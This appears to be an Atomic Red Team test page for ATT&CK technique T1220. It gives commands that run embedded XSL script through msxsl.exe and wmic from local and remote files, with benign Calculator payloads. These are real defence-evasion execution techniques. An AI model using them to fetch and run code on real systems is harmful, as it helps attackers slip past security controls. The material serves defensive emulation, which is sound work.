---
tags: [T1220, atomic_test]
filename: "[[T1220 - XSL Script Processing]]"
---
# T1220 - XSL Script Processing

## Atomic Test #1 - MSXSL Bypass using local files
Executes the code specified within a XSL script tag during XSL transformation using a local payload. 
Requires download of MSXSL. No longer available from Microsoft.
(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) 
Open Calculator.exe when test successfully executed, while AV turned off.

**Supported Platforms:** Windows


**auto_generated_guid:** ca23bfb2-023f-49c5-8802-e66997de462d





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| xmlfile | Location of the test XML file on the local filesystem. | path | PathToAtomicsFolder&#92;T1220&#92;src&#92;msxslxmlfile.xml|
| xslfile | Location of the test XSL script file on the local filesystem. | path | PathToAtomicsFolder&#92;T1220&#92;src&#92;msxslscript.xsl|
| msxsl_exe | Location of the MSXSL executable. | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;msxsl.exe|


#### Attack Commands: Run with `command_prompt`! 


```cmd
"#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
```

#### Cleanup Commands:
```cmd
del "#{msxsl_exe}" >nul 2>&1
```



#### Dependencies:  Run with `powershell`!
##### Description: XML file must exist on disk at specified location (#{xmlfile})
##### Check Prereq Commands:
```powershell
if (Test-Path "#{xmlfile}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path "#{xmlfile}") -ErrorAction Ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
```
##### Description: XSL file must exist on disk at specified location (#{xslfile})
##### Check Prereq Commands:
```powershell
if (Test-Path "#{xslfile}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path "#{xslfile}") -ErrorAction Ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
```
##### Description: msxsl.exe must exist on disk at specified location (#{msxsl_exe})
##### Check Prereq Commands:
```powershell
if (Test-Path "#{msxsl_exe}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
```




<br/>
<br/>

## Atomic Test #2 - MSXSL Bypass using remote files
Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
Requires download of MSXSL.exe. No longer available from Microsoft.
(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
Open Calculator.exe when test successfully executed, while AV turned off.

**Supported Platforms:** Windows


**auto_generated_guid:** a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| xmlfile | Remote location (URL) of the test XML file. | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml|
| xslfile | Remote location (URL) of the test XSL script file. | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl|
| msxsl_exe | Location of the MSXSL executable. | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;msxsl.exe|


#### Attack Commands: Run with `command_prompt`! 


```cmd
"#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
```

#### Cleanup Commands:
```cmd
del -Path #{msxsl_exe} >nul 2>&1
```



#### Dependencies:  Run with `powershell`!
##### Description: msxsl.exe must exist on disk at specified location ("#{msxsl_exe}")
##### Check Prereq Commands:
```powershell
if (Test-Path "#{msxsl_exe}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
```




<br/>
<br/>

## Atomic Test #3 - WMIC bypass using local XSL file
Executes the code specified within a XSL script using a local payload.

**Supported Platforms:** Windows


**auto_generated_guid:** 1b237334-3e21-4a0c-8178-b8c996124988





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| wmic_command | WMI command to execute using wmic.exe | string | process list|
| local_xsl_file | Location of the test XSL script file on the local filesystem. | path | PathToAtomicsFolder&#92;T1220&#92;src&#92;wmicscript.xsl|


#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
```




#### Dependencies:  Run with `powershell`!
##### Description: XSL file must exist on disk at specified location (#{local_xsl_file})
##### Check Prereq Commands:
```powershell
if (Test-Path "#{local_xsl_file}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path "#{local_xsl_file}") -ErrorAction Ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
```




<br/>
<br/>

## Atomic Test #4 - WMIC bypass using remote XSL file
Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.

**Supported Platforms:** Windows


**auto_generated_guid:** 7f5be499-33be-4129-a560-66021f379b9b





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_xsl_file | Remote location of an XSL payload. | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl|
| wmic_command | WMI command to execute using wmic.exe | string | process list|


#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
```






<br/>
